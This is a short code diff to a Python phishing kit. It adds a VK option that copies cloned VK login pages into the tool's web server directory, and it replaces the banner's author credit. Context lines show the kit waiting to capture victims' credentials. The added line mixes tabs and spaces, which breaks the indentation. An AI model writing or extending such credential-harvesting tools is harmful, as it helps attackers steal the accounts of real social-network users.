@@ -91,6 +91,8 @@ def runPhishing(social, option2):
         system('cp WebPages/stackoverflow/*.* Server/www/')
     elif social == 'WordPress':
         system('cp WebPages/wordpress/*.* Server/www/')
+	elif social == 'VK':
+        system('cp WebPages/vk/*.* Server/www/')
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
@@ -118,7 +120,7 @@ def runPEnv():
       .    '   '....'               ..'.      ' .
          '  .                     .     '          '     '  {1}v1.0{2} 
                '  .  .  .  .  . '.    .'              '  .
-                   '         '    '. '      {1}Twitter: https://twitter.com/A1S0N_{2}    
+                   '         '    '. '      {1}UA DESIGNER | VK SERVER | FOX | KRAMATORSK{2}    
                      '       '      '             
                        ' .  '
                            '
